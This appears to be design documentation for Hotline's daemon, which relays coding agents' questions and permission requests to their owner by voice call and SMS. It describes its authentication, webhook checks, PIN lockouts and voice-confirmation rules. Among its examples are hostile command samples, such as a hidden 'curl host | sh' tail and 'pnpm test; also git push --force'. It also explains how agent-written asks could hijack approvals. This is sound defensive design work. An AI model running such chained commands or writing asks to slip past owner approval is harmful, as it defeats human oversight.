# Daemon

`hotline daemon` runs the one long-lived Hotline process (`packages/daemon`). It
runs in the foreground until SIGINT or SIGTERM. This page covers the skeleton from
HL-04; call orchestration (HL-09) and the inbound line (HL-10) build on it.

Only one daemon runs per hotline home. On start it creates `daemon.lock` (its
process id, mode 0600) before it creates the token or opens the database, and a
second daemon on the same home exits with "already running". A lock left by a
process that no longer exists is replaced, but only by the starter that first
creates `daemon.lock.break`, so two simultaneous starters cannot both take
over. A clean stop removes the lock.

## Listeners

Both listeners bind `127.0.0.1` only. The address is a constant, not a setting.

| Listener | Port | Serves | Who calls it |
| --- | --- | --- | --- |
| Agent API | `daemon.port` (default 7341) | `/v1/*` | The MCP server and hook adapters on this Mac |
| Webhooks | `daemon.port + 1` | `/hooks/*` only | Twilio and ElevenLabs, through the tunnel |

Point the tunnel at the webhook port. Because the agent API is on a different
port, a tunnel cannot reach it whatever its own path rules say. `--port <n>`
overrides `daemon.port`, and `--port 0` picks free ports for both (tests).

### Agent API

Every request, including one for a path that does not exist, must carry:

- `Authorization: Bearer <token>` with the per-install token. A missing or wrong
  token gets `401`, compared in constant time (both sides hashed with SHA-256,
  then `timingSafeEqual`).
- A `Host` of `127.0.0.1:<port>` or `localhost:<port>`. Anything else gets `403`.
  That blocks DNS-rebinding pages and a tunnel pointed at the wrong port.

The token is the `daemon.apiToken` secret: 32 random bytes in base64url, created
on first start in the configured secret store (the Keychain on macOS, else the
`0600` secrets file) and reused after that. The MCP server and hook adapters read
it from the same store.

Routes today (`agent-routes.ts`; the MCP server in [mcp.md](mcp.md) and the hook
adapters in [hooks.md](hooks.md) are the clients):

| Route | Does |
| --- | --- |
| `GET /v1/health` | `{"ok": true, "version": "..."}` |
| `POST /v1/sessions` | Registers `{agent, cwd, agentSessionId?}` and returns `{session}` (201). A live session with the same agent and `agentSessionId` is reused (200). A new one first ends stale sessions ([session lifetime](#session-lifetime)); at 20 live sessions it ends one idle for 15 minutes with nothing open, or gets `429` (audited as `session.refused`) |
| `POST /v1/sessions/:sessionId/asks` | Queues `{kind, text, options?, toolName?, risk?, urgent?}` and returns `{ask}` (201). `kind` is `question`, `notify`, `permission` or `stop`. Only questions carry `options`; `permission` requires `toolName` (identifier characters, up to 100) and `risk` (`low` or `high`), and no other kind may send them. Text, options and the tool name are redacted before they are stored. The ask expires after `policy.askTimeoutMinutes`. Open-ask caps per session / across all sessions: questions 3 / 10, notifications 10 / 30, permission requests 3 / 10, stops 1 / 10; past them `429` (audited as `ask.refused`). A new `stop` cancels the session's older open `stop` first. `urgent` is the agent's request only; call policy decides |
| `GET /v1/asks/:askId/outcome?waitSeconds=0..30` | `{state: "waiting", ask}` or `{state: "final", ask, outcome}`, waiting up to `waitSeconds` for a change |
| `POST /v1/asks/:askId/cancel` | Cancels an ask that is still open: `{cancelled}` |
| `POST /v1/sessions/:sessionId/end` | Marks the session `ended`, cancels its open asks and drops its queued instructions: `{ended}`. An ended session takes no new asks, and its inbox and instruction routes answer `404` too, so its client registers again |
| `GET /v1/sessions/:sessionId/inbox` | `{session, instructions, asks}`: the owner's queued instructions for this session ([inbound line](#inbound-line)) with their ids, listed but not handed over (the reader acknowledges them), and the 20 newest asks with their outcomes |
| `GET /v1/sessions/:sessionId/instructions` | Lists the session's queued instructions, oldest first, without handing them over: `{instructions: [{id, text, receivedAt}]}` |
| `POST /v1/sessions/:sessionId/instructions/ack` | `{via: "ask" \| "stop", ids}` marks those of `ids` still queued (and within their 6 hours) delivered and returns them: `{instructions: [{text, receivedAt}]}`. A reader acknowledges only what it is about to pass on: the MCP server just before it returns `ask_human`, the Stop hook once away mode and its count are settled |

Bodies are strict: an unknown field, a relative `cwd`, more than 9 options,
options on anything but a question, or a `toolName` or `risk` that is missing
from a permission request or sent with another kind gets `400` with the failing
paths, never the values. An unknown session or ask gets `404`.

The `risk` of a permission request is the hook's classification of the full
tool input (`classifyPermission`, see [hooks.md](hooks.md#risk-classes-plan-question-6)).
Any token holder can send it, so the hook also judges the outcome with the
stricter of its own class and the stored one.

Before counting against the caps, every open ask past its `expiresAt` is marked
`expired`, so asks nobody polls (a killed agent, an undelivered notification)
stop blocking new ones. The routes do not check that an ask belongs to the
caller's session: the per-install token is the only boundary, and any holder
of it can act on any session.

An outcome is `answered` only when the store holds the answer, which
`recordAnswer` accepted after `answerProblem` passed. An open ask whose
`expiresAt` has passed on the daemon's clock is marked `expired` when it is next
read and reported as `no-answer` with reason `timeout`, and `cancelled` as
`no-answer` with reason `cancelled`. Nothing else produces an outcome.

The store tells listeners about every committed status change
(`onAskChange`), so a waiting outcome request returns as soon as the ask is
answered, expires or is cancelled, and the session's state follows its asks
(`waiting-on-human` while it has an open question, permission request or stop,
else `working`). On
shutdown, waiting requests return at once. Agent API connections still open
2 seconds later are closed: a client that aborted a long poll could otherwise
hold the shutdown until the keep-alive timeout.

### Webhooks

Every route under `/hooks` must declare a verifier (`WebhookRoute.verify`). It
fails closed in three places:

1. Before the body is read, a request for a route without a verifier gets `403`.
   Every path that no ticket has implemented yet lands on a catch-all route
   without one. A route's optional `precheck` (such as "the signature header is
   there") also runs here, before any parsing.
2. Parsing. A body the server cannot read (malformed form encoding, invalid
   UTF-8, an unsupported content type, over 256 KiB) gets `403`, not a 4xx that
   would show the route exists. Form bodies are parsed strictly by
   `parseFormBody`, which keeps repeated names so a verifier can refuse them.
   JSON bodies are not parsed here: they stay raw text, so a verifier can check
   an HMAC over the exact bytes, and the route parses them after verification.
3. After parsing, the verifier runs. Anything other than a literal `true`
   (`false`, a truthy value, a throw or a rejected promise) gets `403`.

A route may also set `bodyLimit` (a larger body limit) and `maxInFlight`
(requests read or handled at once; more get the 403 before their body is read),
with `bodyTimeoutMs` (default 10 s) after which a sender that has not delivered
its body is cut off.
Every rejection is the same bare `403` with an empty body, so a scanner cannot
tell a missing route from a bad signature or a malformed body. A rejected request
is logged with its method, path and reason (`no verifier`, `precheck failed`,
`unreadable request`, `verification failed`) only, never its body, headers or
query string. Paths outside `/hooks` get `404`. Routes are added through
`startDaemon({ webhookRoutes })`.

### Twilio SMS (`POST /hooks/twilio/sms`)

Point the Twilio number's "A message comes in" webhook (HTTP POST) at exactly
`<tunnel.publicUrl>/hooks/twilio/sms`, with no explicit `:443` and no query
string. Twilio signs the URL it was given, and the daemon rebuilds it from
`tunnel.publicUrl` (which the config already limits to a bare origin), so any
other spelling fails verification with a plain 403. `runDaemon` registers the route only when
`sms.provider` is `twilio`, `sms.fromNumber` and `tunnel.publicUrl` are set, and
the `twilio.accountSid` and `twilio.authToken` secrets exist. Otherwise it logs
`sms webhook off` with the reason and the path stays a `403`.

- **Precheck:** an `X-Twilio-Signature` header and a form content type, or `403`
  before the body is read.
- **Bounded:** at most 8 texts are read or handled at once
  (`MAX_SMS_IN_FLIGHT`, HL-13b), each given 5 seconds to deliver its body;
  more get the `403` before their body is read. Anyone can send a signature
  header, and the signature can only be checked over the body, so this caps
  what unauthenticated senders can make the daemon hold. A flood can still
  delay a genuine text until it passes.
- **Verify:** the signature is recomputed with Twilio's documented algorithm
  (`validTwilioSignature` in `@hotline/providers`) over the exact public URL
  (`publicUrl` origin plus the raw path and query) and the form parameters, and
  compared in constant time. A repeated parameter name, or an `AccountSid` other
  than ours, fails.
- **Owner only:** only a text from `owner.phoneNumber` to `sms.fromNumber`
  reaches the handler. Any other sender gets one generic reply ("Sorry, this
  number does not accept messages."), at most 5 per hour in total, and is
  recorded in the audit log by message SID only.
- **Verified by pull (HL-13a):** a valid signature only shows the request was
  signed with the auth token, which any process running as the owner can read.
  So before an owner's text reaches the handler, the route fetches the message
  from Twilio's REST API by `MessageSid` (`lookup`, the SMS provider's
  `fetchMessage`: `GET /2010-04-01/Accounts/<sid>/Messages/<MessageSid>.json`)
  and checks Twilio's record (`smsMismatch` in `provider-pull.ts`): the same
  SID, `direction` `inbound`, status `received` or `receiving`, `from` the
  owner's number and `to` the Hotline number (strict E.164), the same body
  byte for byte, and `date_created` at most 15 minutes before the webhook (5
  minutes of clock skew ahead). A lookup that fails (network, a 404, an answer
  that is not that message) or a record that differs means the text is not
  used at all: the handler never sees it, the reply is "Hotline: your text could
  not be confirmed with Twilio, so it was not used. Please send it again.", and
  the SID is not remembered as handled, so a genuine retry is pulled again. A
  404 or a mismatch is audited as `security.possible-forgery` and texts the
  owner (at most once an hour); an outage is audited as `security.unverified`
  and texts nothing. A text from any other number is never looked up: it never
  reaches the handler anyway.
- **Once per message:** the last 1000 successfully handled message SIDs are
  remembered, so a Twilio retry or a replayed request is answered with empty
  TwiML and not handled twice. A SID counts as handled only after its handler
  succeeds: a failure (owner handler or the other-sender audit write) leaves it
  unhandled so Twilio's retry can get through, and a copy that arrives while
  the first is still being handled waits for that attempt, then either answers
  with empty TwiML or, if the attempt failed, handles the message itself.
  Across restarts, call orchestration's `inbound_messages` table remembers
  each SID for 400 days (see [Store](#store)).
- **Replies are redacted:** a reply the owner handler returns goes through the
  required `redact` option (the daemon's redactor) and the SMS length check
  before it is put in the TwiML. One that is empty after redaction or longer
  than 1600 characters is dropped with a warning that names only the SID.
- **Opt-out keywords:** when Twilio sends `OptOutType` (`STOP`, `START`, `HELP`)
  it has already replied, so Hotline adds no reply of its own.
- **Logs:** the message SID and `sender: owner|other` only, never the text,
  numbers or signature.

An owner's text goes to [call orchestration](#call-orchestration), which
records it in the audit log as `sms.received` with its SID and reply type
(`yes`, `option`, `status`, ...), never its words, and answers asks by text.

### ElevenLabs (`/hooks/el/*`)

**What a restart keeps (HL-13b).** The PinGate's hourly and daily budgets of
wrong PINs (`pin_failures`), the server-tool delivery memory
(`tool_deliveries`), the held instructions and session numbers of inbound
calls (`inbound_calls`), and when the forgery alarm and each direction's
lockout text last went out (`daemon_state`) are in SQLite, so a restart hands
a PIN guesser no fresh budget, does not run a replayed tool call again, and
allows no early second text. Two things stay in memory on purpose, both
failing closed: which calls proved the PIN (after a restart a call is asked
for it again; until then `get_status` and `send_instruction` answer
`pin-required`), and each call's own two attempts (a call that was
mid-guess gets them back, still inside the stored budgets). The post-call
replay memory stays in memory too; why a replay after a restart is harmless
is under "Once per event" below. If the PIN budgets cannot be read or written,
the attempt is refused without checking the PIN; if the delivery memory
cannot be read, the tool answers `busy`; if it cannot be written, the delivery
is remembered for this run only.

**Verified by pull (HL-13a).** The tool secret and the post-call HMAC secret
can be read by any process running as the owner, so neither proves a request
came from ElevenLabs. What does is ElevenLabs' own record of the conversation,
fetched by id with the API key (`conversation`, the voice provider's
`fetchConversation`: `GET /v1/convai/conversations/<id>`,
https://elevenlabs.io/docs/api-reference/conversations/get). `runDaemon`
passes the configured voice provider's; without one (no `elevenlabs.apiKey`,
or a provider that cannot pull) it registers no voice route at all, so every
tool call and post-call webhook is the bare 403: no PIN, decision,
instruction or status goes through. Every server tool and every post-call
event, a call initiation failure included, is checked against the pulled
record before it has any effect. Checks live in `provider-pull.ts`; a mismatch
goes to `onUnverified`, which audits `security.possible-forgery` and texts the
owner at most once an hour (an outage is `security.unverified`, no text).

`elevenLabsRoutes` (`elevenlabs-webhook.ts`) serves the voice agent's four
server tools and the post-call webhook. `runDaemon` registers them only when
`voice.provider` is `elevenlabs`, `voice.agentId`, `voice.agentPhoneNumberId`
and `tunnel.publicUrl` are set, the `elevenlabs.toolSecret` and
`elevenlabs.webhookSecret` secrets exist, and the voice provider can pull
conversations (it has `elevenlabs.apiKey`).
Otherwise it logs `voice webhooks off` with the reason and the paths stay a
`403`. The tool definitions that point ElevenLabs at these URLs are in
`@hotline/providers` (`hotlineToolConfigs`; see [contracts](contracts.md#voice-providers)).

**Server tools** (`POST /hooks/el/tools/<name>`):

- **Precheck:** the `x-hotline-tool-secret` header must equal
  `elevenlabs.toolSecret`, compared in constant time (both sides hashed with
  SHA-256), and the content type must be JSON, or `403` before the body is
  read. An empty secret never matches. `verify` repeats the secret check.
- **Bounded:** each tool reads or handles at most 8 calls at once
  (`MAX_TOOL_CALLS_IN_FLIGHT`, HL-13b), each given 5 seconds to deliver its
  body; more get the `403`. Only a sender with the tool secret gets that far.
- **Once per delivery:** `submit_answer`, `verify_pin` and `send_instruction`
  remember each delivery (tool name and exact body) for two hours. A repeat,
  such as an ElevenLabs retry or a replay, gets the first response and the
  handler does not run again, so a repeated wrong PIN spends no attempt. Only
  deliveries that changed state are remembered (`recorded`, `queued`, or a PIN
  attempt); anything else (`pin-required`, `needs-pin`, `not-recorded`,
  `invalid`, `refused`) or a failure is forgotten, so the same call can succeed
  once it is allowed, such as an approval resent after `verify_pin`. One
  consequence: the owner giving the same session the same instruction twice in
  one call (byte-identical body) queues it once, though the voice agent hears
  `queued` both times. Likewise a byte-identical `verify_pin` in the same call gets
  its first answer again, even after a lockout has ended; the owner has to say
  the PIN on a new call. A
  remembered delivery is never evicted before its window ends: with 1000 live
  ones (only possible with the tool secret), a new delivery gets
  `{"result": "busy"}` and does not run. `get_status` only
  reads, after the PIN, and runs every time. Remembered deliveries are kept in
  the store (`tool_deliveries`), so a replay after a restart also gets the
  first response (HL-13b); deliveries still running are in memory.
- **Owner on the call:** the body's `caller_id` or `called_number`, which
  ElevenLabs fills from `system__caller_id` and `system__called_number`, must be
  `owner.phoneNumber`. Otherwise the answer is `{"result": "refused",
  "end_call": true}` and no handler runs. The voice model cannot set these
  fields: they are dynamic-variable parameters, not model-filled ones.
- **The live call at ElevenLabs (HL-13a):** before any tool has an effect (a
  PIN attempt, a held answer or instruction, a denial, a status read out), the
  conversation is pulled. It must exist, belong to `voice.agentId`, be going on
  (`initiated` or `in-progress`), be a phone call with a direction on
  `voice.agentPhoneNumberId` whose Hotline end is a strict E.164 number other
  than the owner's and whose far end is `owner.phoneNumber`, and the body's
  `caller_id`, `called_number` (both required, strict E.164) and `call_sid`
  must be exactly the record's for that direction. Otherwise
  `{"result": "refused", "end_call": true}`, nothing runs, and the reason goes to
  `onUnverified`. The call's direction comes from the record, not the body:
  outbound only when ElevenLabs dialled out and `placedCall` says Hotline placed
  it; anything else is inbound and needs the PIN. So a forged tool call, even
  for a real conversation after its PIN was verified, can neither guess nor
  lock the PIN, hold or deny a decision, queue an instruction nor hear the
  status once the call is over.
- A verified request whose JSON or fields do not parse gets `{"result": "invalid"}`.

| Tool | What the route does |
| --- | --- |
| `verify_pin` | Pulled first, as above: a forged tool call for a made-up conversation never counts an attempt, so it can neither guess the PIN nor lock it. Then checks the PIN with the `PinGate`: 2 wrong PINs per call, then `end_call: true` and no further checks on that call; 6 wrong PINs across all calls of one direction in a rolling hour, or 10 in a rolling day, lock every check on that direction, the right PIN included, until enough time has passed. A caller spoofing the owner's number therefore gets at most 10 guesses a day (0.1% of a 4-digit PIN space). Each lockout calls the PinGate's `onLockout`, and the inbound line texts the owner (at most once an hour per direction). Inbound and outbound calls have separate budgets, so someone guessing on inbound calls (caller ID can be spoofed) cannot block PIN approvals on calls Hotline placed to the owner. The trade-off: such guessing still locks the owner's own inbound line for up to an hour, which fails closed. Answers `{verified, attempts_left, end_call}`. A verified PIN is registered with the redactor (`addShortSecret`). The PIN is checked against `owner.pinHash` with scrypt and never logged or stored |
| `submit_answer` | On an inbound call, `pin-required` until this call passed `verify_pin`, because caller ID can be spoofed. A call is outbound only when ElevenLabs' record has it dialled out to the owner and the injected `placedCall(conversationId)` says Hotline placed it (call orchestration knows); everything else counts as inbound. `runDaemon` passes call orchestration's `placedCall`, true from the moment a call is placed until its post-call event, its failure or the stuck-call limit. Otherwise passes the ask number, decision (`option`, `allow`, `deny`, `text`, `done` or `unclear`), the owner's words, the direction and the call ids to the `submitAnswer` handler. `confirmation` is `pin` only when this call passed `verify_pin`; nothing in the request can set it |
| `get_status` | `{"result": "pin-required"}` until this call passed `verify_pin`. Then the `getStatus` handler's text (the [inbound line](#inbound-line)'s numbered status), redacted and cut to 1500 characters |
| `send_instruction` | `pin-required` until this call passed `verify_pin`. Then the `sendInstruction` handler gets the session number, instruction and the owner's words, and answers `queued` (held until the post-call transcript confirms it), `unknown-session` (not a number this call's status read out, or that session ended), `too-many` or `invalid` |

**Post-call webhook** (`POST /hooks/el/post-call`):

- **Precheck:** a well-formed, fresh `ElevenLabs-Signature` header (exactly
  one `t=` timestamp within the tolerance below and one `v0=` of 64 hex digits)
  and a JSON content type. The HMAC covers the body, so it can only be checked
  after the body is read; at most 4 post-call requests are read or handled at
  once (`maxInFlight` on the route), and the rest get the bare 403 before their
  body is read. A sender that has not delivered its body within 5 seconds is
  cut off. Behind the tunnel every request comes from 127.0.0.1, so a per-IP
  limit would not help; a determined sender can still keep real webhooks out,
  which fails closed (call orchestration treats a missing post-call event as no answer). A slot is given
  back when the response is sent or the sender goes away. Rate limiting at the
  tunnel is still worthwhile.
- **Verify:** `t=<seconds>,v0=<hex HMAC-SHA256(webhookSecret, "<t>.<raw body>")>`,
  the algorithm of ElevenLabs' SDK, compared in constant time over the raw body.
  A timestamp more than 30 minutes old or 5 minutes ahead fails.
- **The body is only a trigger (HL-13a):** for a `post_call_transcription`, the
  conversation is pulled from ElevenLabs, and the handlers get ElevenLabs'
  transcript, metadata (direction, numbers, call SID, duration) and status,
  never the body's; whose turns count as the owner's is decided from the pulled
  metadata too. A body that differs from the record is audited as a possible
  forgery (the record is still what counts). The record must be this agent's
  finished phone call with a direction, on `voice.agentPhoneNumberId`, whose
  Hotline end is a strict E.164 number other than the owner's; outbound only
  when `placedCall` says Hotline placed it, to `owner.phoneNumber`, and inbound
  only when Hotline did not place it. A finished call that is not with the
  owner (a stranger calling in, or an outbound call Hotline no longer waits on)
  is handed on with no transcript turns, so it is recorded but nothing said on
  it counts. ElevenLabs having no such conversation, or any other mismatch,
  becomes a failed call (an initiation failure with reason `unknown`): nothing
  is confirmed, and every ask on it ends as no answer under the queue's usual
  retry and text rules. A record still `initiated`, `in-progress` or
  `processing` means the event came before the call was over, which ElevenLabs
  never does: it is audited as a possible forgery and left unhandled, so the
  genuine event still counts when it comes.
- **Call initiation failures are pulled too:** a `call_initiation_failure` is
  acted on only when the record shows that call failed: this agent's outbound
  call on the Hotline number to `owner.phoneNumber`, placed by Hotline, status
  `failed`, with no words from the person in it. Otherwise it is ignored and
  audited (a possible forgery, except for a call Hotline no longer waits on),
  so a forged one cannot end a live call, nor start retries and texts. The
  failure reason (`busy`, `no-answer`) is the event's: both end the call as no
  pickup, and only for a call that really failed.
- **Retry on an outage:** when ElevenLabs cannot be reached or refuses the
  lookup, the route answers `503` and handles nothing, so ElevenLabs delivers
  the event again and the genuine transcript is not lost. Until a delivery
  gets through, the call's asks wait, and end as no answer at their timeout.
- **Once per event:** a `post_call_transcription` or `call_initiation_failure`
  for a conversation is handled once. A replay, or a retry after success, gets
  `200` and is ignored, whatever its signature header looks like. Events are
  remembered for 35 minutes, past the signature's age limit. A failed handler
  leaves the event unhandled, so ElevenLabs' retry gets through. Live events
  are never evicted: with 1000 held, a new one gets `503` so ElevenLabs
  retries it later. This memory is not persisted (HL-13b decided it need not
  be): a signed body replayed within its 30 minute window after a restart is
  pulled and handled again, and changes nothing, because everything it could
  act on is already in SQLite. Call orchestration's saved state knows the call
  is over and ignores it (`voice.post-call-ignored`); the inbound line deleted
  the call's held instructions when it handled the event, and
  `addInstruction` is idempotent by id, so nothing is queued or texted twice;
  the inbound call record is an upsert by conversation. Tests:
  `orchestration.test.ts` ("a replayed post-call event after a restart changes
  nothing") and `inbound-line.test.ts` ("keeps held instructions across a
  restart").
- **Known limits:** on an outbound call, whoever picks up the owner's phone
  counts as the owner (high-risk approvals still need the PIN). The inbound
  PIN boundary compares the daemon's clock with ElevenLabs' call start time
  with no skew margin; a turn at the same second as the verification is a
  caller's.
- **Who spoke:** the person's transcript turns are labelled `owner` only on an
  outbound call Hotline placed whose other end is `owner.phoneNumber`, or, on an inbound call
  from that number, turns spoken after `verify_pin` succeeded (call start plus
  the turn's time in the call, against the PinGate's verification time; a turn
  without a time does not count). Everything else is a `caller` turn, which
  `ownerSaid` never matches.
- Events for another agent id and other webhook types (such as
  `post_call_audio`) get `200` and are ignored. This route reads bodies up to
  1 MiB (the listener's default is 256 KiB), enough for a long transcript; a
  bigger body gets the bare 403. Do not enable audio webhooks.
- **Logs:** tool name and result, event kind. Never bodies, words, transcripts,
  PINs or numbers.

`submit_answer` goes to call orchestration (below), `get_status` and
`send_instruction` to the [inbound line](#inbound-line), and the post-call
webhook to both. `PinGate.onLockout` goes to the inbound line, which audits it
(`voice.pin-lockout`) and texts the owner.

## Call orchestration

`CallOrchestrator` (`orchestrator.ts`, HL-09) connects the agent API, the
store, the providers and the webhooks through core's pure queue
([contracts](contracts.md#ask-queue-and-call-policy-queuets-policyts)).

It is split into four files (HL-09b). The package exports the same names as
before, all through `orchestrator.ts`: `CallOrchestrator`,
`CallOrchestratorOptions`, `OrchestratorLog`, `ORCHESTRATOR_STATE_KEY`,
`RATE_STATE_KEY`, `STOP_WAIT_MS` and `CALL_CENTS_PER_MINUTE`. The parts
(`OrchestratorState`, `VoiceCalls`, `OwnerTexts`) are internal.

| File | Holds |
| --- | --- |
| `orchestrator.ts` | The coordinator: `CallOrchestrator`, one step at a time, the queue, the timer, `start`/`stop`, resolving asks |
| `orchestrator-state.ts` | The saved state (`daemon_state` keys `orchestrator` and `orchestrator.rates`), its fail-closed restore, crash recovery of a step's unfinished actions, and the checks made before anything goes out |
| `orchestrator-voice.ts` | Placing calls, holding `submit_answer` answers, confirming them against the post-call transcript, call records |
| `orchestrator-texts.ts` | Texting asks with confirmation codes and applying the owner's replies; `owner-texts.ts` (pure) plans what a reply means and words the texts |

- **Driving the queue.** Every new ask the store takes (`onAskAdded`, whatever
  route stored it) and every status change made outside the queue (`onAskChange`:
  a cancel, a session end, the agent API expiring an ask) becomes a queue event.
  Steps run one at a time with the daemon's clock. After each step the
  orchestrator saves its state (the `QueueState`, the calls it is waiting on with
  their held answers, and the text confirmation codes) in the `daemon_state`
  table, carries out the actions in order, feeds back what they lead to
  (`text-sent`, `text-failed`, `call-ended`), and sets one timer for
  `nextWakeAt` (at least 100 ms away). On start it restores that state, drops
  asks that closed while it was down, and queues open asks it did not know.
  Unreadable state fails closed: open asks are queued afresh. The call and text
  times are also saved under their own key, so the rate limits keep counting
  what was already sent; if those are unreadable too, the hourly call and text
  windows start out full (`orchestration.rates-reset`), so corrupt state can
  never set off a burst. Nothing else runs until start has finished: webhooks
  and agent requests wait for it.
- **Crash recovery.** Each step's actions are saved with the queue state that
  assumes them and crossed off one by one as they are carried out. On start,
  whatever the last run left undone is finished (`orchestration.recovered`): a
  call that may or may not have been placed counts as failed, so the queue's
  retry rules apply. Known limit: a crash between the provider accepting a call
  and its record being saved leaves a call Hotline no longer knows about; its
  answers are not served, and the retry may ring the owner a second time while
  the first call is still ringing (bounded by the call limits). A text is sent
  again (at least once), with a fresh confirmation code that replaces the one
  it had (only a hash of that is kept); recording an answer, closing an ask and ending a call are
  idempotent. A post-call event's call stays live until all of its answers
  have reached the queue, so ElevenLabs' retry after a failure applies them
  again and the queue ignores the ones already applied.
- **Stopping.** On shutdown, `stop` refuses new steps and waits at most 5
  seconds for the one in progress. A slower provider request (ElevenLabs
  allows 15 seconds) is left behind, and what its step did not finish is
  recovered on the next start.
- **Before anything goes out** each ask is checked again, with a fresh clock
  reading: still open in the store, its session not ended, and not past
  `expiresAt` (an earlier slow send in the same step may have run past it). An
  ask that is closed or whose session ended is cancelled in the queue; an
  expired one is left to expire in the queue with its own reason. Either way it
  is left out of the call or text (`ask.not-called`, `ask.not-texted`), so an
  agent that gave up while the daemon was down is never called about.
- **Reasons before reads.** When an agent reads an ask past its `expiresAt`
  (outcome, inbox, or a new ask counting against the caps), the agent API first
  runs the orchestrator's due work (`settle`), so the ask ends with its specific
  reason rather than a plain `timeout` from whichever timer fired first.
- **Calls.** `place-call` reads the remaining asks out in the queue's order:
  ask number N on the call is the Nth. The provider gets the session nickname,
  kind, risk, tool, options and the (already redacted) text; `callVariables`
  redacts and cuts them again. A provider error is `call-ended: failed`. No
  provider offers a hang-up, so on `end-call` (the queue gave up after 15
  minutes) the daemon stops serving the call: its tool calls answer
  `not-recorded` and its post-call event changes nothing.
- **Voice answers are held, then confirmed.** `submit_answer` is accepted only
  on a call Hotline placed and is still waiting on, as an outbound call, for an
  ask still on that call. A high-risk `allow` without the PIN on this call is
  `needs-pin`. A deny always wins: once one is held for an ask, a later
  different decision gets `not-recorded`, and a later deny replaces anything
  held. Two different decisions that are not a deny cancel each other
  (`voice.answer-conflict`). Accepted answers are held (`recorded` tells the
  voice agent they arrived) until the post-call transcript. There each held
  answer must pass `confirmVoiceDecision` (`voice-confirm.ts`):
  - the agent turns that read the ask are found by their key words (the
    ask's text, session name and tool, minus very common words; the call's
    first agent turn, the fixed greeting, never counts). Attribution is strict
    and unique, because asks are written by agents and one could be written to
    take over another's reading ("pnpm test" and "pnpm test; also git push
    --force"). A turn is a candidate for an ask when it holds at least half of
    that ask's key words, or, for a long ask (more than 8 key words in its
    text), at least 4 of the key words in its text that no other ask on the
    call has, so a one-sentence read-back of a long ask is still recognised;
    the session name and tool alone never make a long ask's reading. With
    other asks on the call:
    - if any candidate has no word of its own (identical asks, or one whose
      words are all inside another's), the turn reads nothing;
    - a candidate is read only if the turn names every key word no other ask
      on the call has (the session name included when the sessions differ; a
      long ask that met the long-ask rule is excused from naming them all),
      and, for a permission request, every token of its command and tool name
      that no other ask has, short ones included (`rm`, `rf`, `f`; only `a`,
      `an`, `to`, `in`, `of`, `on`, `at`, `by`, `it`, `is`, `or`, `as`, `be`
      and the very common words are skipped). So "git push" never reads "git
      push -f", and a read-back naming `Read` reads the `Read` ask, not the
      `Write` one on the same file;
    - exactly one such candidate is read; more than one reads nothing.
    Alone on a call, an ask has nothing to be told apart from and the share
    rule alone applies to its readings. With several asks, a read-back that leaves
    out a distinguishing word (often the agent part of the session name, or a
    long command's tail) reads nothing, and the ask is texted. The ask's windows are the person's turns right
    after each such reading, up to the next agent turn of any kind: an agent
    turn not recognised as reading this ask (a paraphrase, a tie, another ask,
    small talk) always closes the window, and a re-reading opens a new one. The
    owner's words must be found in a window with `ownerSaid`. A "yes" said
    before the ask was read, or after anything else the agent said, never
    confirms it;
  - free text (a question's answer, a stop's next instruction) must itself be
    words the owner said;
  - an option must be named in the owner's words (its digit, ordinal, number
    word or most of its own words), and no other offered option may be ("the
    second one" names option 2 only); `done` needs a word for it ("done",
    "that's it", "nothing"), though letting a stopped agent finish is also what
    no answer does;
  - an answer is taken back by anything the owner said about the ask after it
    that sounds doubtful (below), such as "no", "wait", "never mind",
    "actually";
  - an `allow` is confirmed by the read-back exchange (HL-09c). The owner's
    direction: approving by voice is as natural as a conversation, and it is
    not limited to phrase matching ("phrase matching is fine so it's quicker
    on common phrases but it should definitely not be limited like a regex").
    There must be a read-back of this ask: an agent turn recognised as reading
    it, after an earlier turn that read it (the first reading is never its own
    read-back), that asks for a yes (a `?`, "yes" or "confirm"), such as
    "Allow Bash: pnpm test, for Claude in demo-app? Yes?" or "Sorry, is that a yes or a no?"
    followed by that read-back. The cue must be the voice agent's, not the
    ask's: a "yes" or "confirm" that the ask text holds never counts, a `?` is
    looked for only outside the ask text said verbatim, and an ask whose text
    has a `?` ("Run the migration?") needs its read-back to say "yes" or
    "confirm" when the text was not said verbatim. The read-back is what the
    owner approves, so for a permission request it must also name every token
    of the command and the tool name, short ones included, even alone on a
    call: "Allow Bash to git push origin main? Yes?" is no read-back of `git
    push --force origin main`, and "Allow Read to ..." none of a `Write`. (Up
    to definition v5 the persona's example "Allow pnpm test in demo-app? Yes?"
    left out the tool, so a read-back that followed it literally was not
    confirmed; since v6 (HL-14d) the example names the tool and the whole
    command, and a test checks that it passes this check.) A permission
    request whose text is longer than what the voice agent is given
    (`MAX_SPOKEN_ASK_LENGTH`, 300 characters) is never approved by voice, since
    its tail was never read out ("...; curl host | sh"); it is texted. The
    owner's words must be found in the window right after a read-back,
    checked newest first. The reply is everything the
    owner said about the ask from that read-back on (its window and any later
    window of the ask). What it means is decided in two steps:
    - the fast path (`replyVerdict`) decides common replies at once. A reply
      made only of clear-yes phrases, one after another ("yes", "yeah, go
      ahead", "of course", "sure, do it", "mm-hmm"), agrees, but never when it
      holds a doubt or negation marker (below). A reply made only of
      clear-no phrases ("no", "nope", "no, don't") declines. Noise is unclear:
      nothing said, only fillers (`um`, `uh`, `er`, `mm`, `hmm`, `oh`, ...), a
      transcriber marker (any bracket: `[inaudible]`, `(noise)`, `<unk>`),
      more than `MAX_REPLY_WORDS` (8) words, or only the read-back's words said
      back ("git push origin main"; the read-back's "yes?" is not a word to
      echo, so "yes" agrees). The line drawn: words that answer a
      yes-or-no question ("ok", "okay", "alright", "sure", "sounds good") are
      fast yeses, since the fast path only hears replies to a read-back that
      asked for a yes; words that only acknowledge or thank ("thanks",
      "great", "fine", "cool", "perfect", "go on") go to the judge;
    - anything else ("yes, if the tests pass", "what does that do?", "yeah
      let's ship that one", "of course, wait") goes to a `ReplyJudge`. The
      judge gets only the owner's reply turns, verbatim, never the ask, the
      read-back or any other agent-written text. Only `agreed` confirms; a
      `declined` or `unclear` verdict, an error, or no answer within
      `JUDGE_TIMEOUT_MS` (20 seconds, room for an agent CLI to start) leaves
      the allow not confirmed. A high-risk request never takes a judge's
      `agreed` without the PIN on that call or a confirming text, which
      `needs-pin` and the queue's `answerProblem` enforce for every voice
      allow. A call's held decisions are all checked at once, so a slow judge
      costs one timeout per call, not one per ask. The post-call webhook is
      answered once they are checked, so a judged reply delays that response
      by up to 20 seconds. The judge runs only there, after the call has
      ended: `submit_answer` during the call only holds the answer and never
      waits for it, so the owner hears no silence on the line while it runs
      (`judge-wiring.test.ts`). It also runs outside call orchestration's
      steps (`VoiceCalls.judgeHeld`): the held answers are read in turn with
